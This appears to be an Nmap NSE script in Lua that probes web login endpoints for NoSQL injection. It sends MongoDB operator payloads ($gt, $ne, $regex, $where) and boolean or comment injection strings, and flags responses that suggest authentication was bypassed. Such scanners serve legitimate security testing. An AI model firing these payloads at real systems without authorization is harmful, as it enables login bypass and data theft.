-- NoSQL Injection Detection
-- Tests for NoSQL injection vulnerabilities

local http = require("http")
local stdnse = require("stdnse")

description = [[
Tests for NoSQL injection vulnerabilities including MongoDB operator
injection and JavaScript injection through web parameters.
]]

author = "Nemue Security Team"
license = "MIT"
categories = {"vuln", "intrusive", "exploit"}

portrule = function(host, port)
    return port.protocol == "tcp" and
           (port.service == "http" or port.service == "https" or
            port.number == 80 or port.number == 443 or
            port.number == 8080)
end

action = function(host, port)
    local output = {}
    local findings = {}

    local json_payloads = {
        {[[{"username":{"$gt":""},"password":{"$gt":""}}]], "Operator injection ($gt)"},
        {[[{"username":{"$ne":""},"password":{"$ne":""}}]], "Operator injection ($ne)"},
        {[[{"username":{"$regex":".*"},"password":{"$regex":".*"}}]], "Regex injection"},
        {[[{"$where":"1==1"}]], "JavaScript injection ($where)"},
    }

    local test_paths = {"/api/login", "/api/auth", "/login", "/auth"}

    for _, test_path in ipairs(test_paths) do
        local check = http.get(host.ip, port, test_path)
        if check and check.status and check.status ~= 404 then
            for _, payload in ipairs(json_payloads) do
                local headers = {["Content-Type"] = "application/json"}
                local body = payload[1]
                local r = http.post(host.ip, port, test_path, headers, nil, body)
                if r and r.status == 200 and r.body then
                    if r.body:find("token") or r.body:find("session") or
                       r.body:find("success") or r.body:find("authenticated") then
                        table.insert(findings, {
                            endpoint = test_path,
                            type = payload[2],
                            payload = body
                        })
                        break
                    end
                end
            end
        end
        if #findings > 0 then break end
    end

    local params = {"user", "username", "id", "search"}
    for _, param in ipairs(params) do
        local payloads = {
            {"' || 1==1//", "Boolean injection"},
            {"admin'--", "Comment injection"},
        }
        for _, payload in ipairs(payloads) do
            local url = "/login?" .. param .. "=" .. payload[1]
            local r = http.get(host.ip, port, url)
            if r and r.status == 200 and r.body then
                if r.body:find("token") or r.body:find("welcome") then
                    table.insert(findings, {
                        endpoint = url,
                        type = payload[2],
                        payload = payload[1]
                    })
                    break
                end
            end
        end
        if #findings > 0 then break end
    end

    if #findings > 0 then
        table.insert(output, "NoSQL Injection Vulnerabilities Found:")
        table.insert(output, "")
        for _, f in ipairs(findings) do
            table.insert(output, "[!] Endpoint: " .. f.endpoint)
            table.insert(output, "[!]   Type: " .. f.type)
            table.insert(output, "[!]   Payload: " .. f.payload)
            table.insert(output, "")
        end
        table.insert(output, "[!] CRITICAL: Allows authentication bypass and data extraction")
        return stdnse.format_output(true, output)
    end

    return nil
end
